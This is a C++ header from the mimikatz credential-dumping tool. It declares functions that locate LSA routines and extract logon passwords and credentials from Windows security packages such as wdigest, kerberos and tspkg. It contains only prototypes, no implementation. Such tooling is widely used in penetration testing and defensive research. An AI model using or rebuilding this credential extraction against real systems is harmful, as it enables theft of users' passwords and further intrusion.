/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence    : http://creativecommons.org/licenses/by-nc-sa/3.0/
	This file  : http://creativecommons.org/licenses/by/3.0/
*/
#pragma once
#include "kmodel.h"
#include "secpkg.h"
#include "mod_memory.h"
#include "mod_system.h"
#include "mod_text.h"

#include "Security Packages\msv1_0.h"
#include "Security Packages\wdigest.h"
#include "Security Packages\tspkg.h"
#include "Security Packages\livessp.h"
#include "Security Packages\kerberos.h"
#include "credman.h"

#include "incognito.h"

bool searchLSAFuncs();
__kextdll bool __cdecl getDescription(wstring * maDescription);
__kextdll bool __cdecl getLogonPasswords(mod_pipe * monPipe, vector<wstring> * mesArguments);

typedef bool (WINAPI * PFN_ENUM_BY_LUID) (__in PLUID logId, __in mod_pipe * monPipe, __in bool justSecurity);
bool		getLogonData(mod_pipe * monPipe, vector<wstring> * mesArguments, vector<pair<PFN_ENUM_BY_LUID, wstring>> * mesProviders);

extern PRTL_LOOKUP_ELEMENT_GENERIC_TABLE_AV	RtlLookupElementGenericTableAvl;
extern PLSA_SECPKG_FUNCTION_TABLE			SeckPkgFunctionTable;

PLIST_ENTRY	getPtrFromLinkedListByLuid(PLIST_ENTRY pSecurityStruct, unsigned long LUIDoffset, PLUID luidToFind);
wstring		getPasswordFromProtectedUnicodeString(LSA_UNICODE_STRING * ptrPass);
void		genericCredsToStream(wostringstream * monStream, PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds, bool justSecurity, bool isTsPkg = false);
